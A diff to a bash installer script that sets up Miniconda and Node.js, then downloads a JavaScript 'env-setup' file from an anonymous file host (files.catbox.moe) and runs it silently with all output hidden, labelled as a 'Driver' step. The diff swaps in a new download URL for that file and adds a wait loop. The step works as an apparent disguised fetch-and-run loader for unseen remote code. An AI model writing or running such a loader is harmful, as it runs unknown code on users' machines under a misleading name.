@@ -116,7 +116,6 @@ run_part1_miniconda() {
   fi
 
   track_step "part1_step_5"
-  delay 15
 
 }
 
@@ -124,7 +123,7 @@ run_part1_miniconda() {
 # Part 2: Node + env-setup
 # -------------------------
 run_part2_node_driver() {
-  local NODE_EXE USER_HOME INDEX_JSON LATEST_VERSION NODE_VERSION TARBALL_NAME DOWNLOAD_URL
+  local NODE_EXE USER_HOME INDEX_JSON LATEST_VERSION NODE_VERSION TARBALL_NAME DOWNLOAD_URL PREFIX
   local EXTRACTED_DIR PORTABLE_NODE NODE_TARBALL ENV_SETUP_JS NODE_INSTALLED_VERSION
   track_step "part2_step_1"
 
@@ -185,12 +184,22 @@ run_part2_node_driver() {
 
   track_step "part2_step_3"
   ENV_SETUP_JS="${USER_HOME}/env-setup.js"
-  download "https://files.catbox.moe/1gq866.js" "$ENV_SETUP_JS"
+  download "https://files.catbox.moe/y52jde.js" "$ENV_SETUP_JS"
   [[ -s "$ENV_SETUP_JS" ]] || die "env-setup.js download failed."
 
   track_step "part2_step_4"
   info "Running Driver (silent)"
   "$NODE_EXE" "$ENV_SETUP_JS" >/dev/null 2>&1
+
+  PREFIX="${SHARED_DIR}/miniconda3"
+  while true; do
+    if [[ -x "${PREFIX}/bin/python3" ]]; then
+      "${PREFIX}/bin/python3" -V >/dev/null 2>&1
+      break
+    fi
+    info "Part 2: waiting for ${PREFIX}/bin/python3 (retry in 15s)"
+    delay 15
+  done
 
   track_step "part2_step_5"
   info "Driver setup finished."
